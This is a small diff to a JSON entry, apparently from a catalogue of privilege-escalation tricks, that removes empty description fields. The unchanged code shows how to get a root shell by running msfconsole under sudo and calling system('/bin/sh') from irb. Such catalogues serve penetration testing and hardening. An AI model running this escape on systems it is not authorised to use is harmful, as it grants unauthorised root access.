@@ -2,13 +2,13 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "sudo msfconsole\nmsf6 > irb\n>> system(\"/bin/sh\")\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo msfconsole\nmsf6 > irb\n>> system(\"/bin/sh\")\n"
       }
     ]
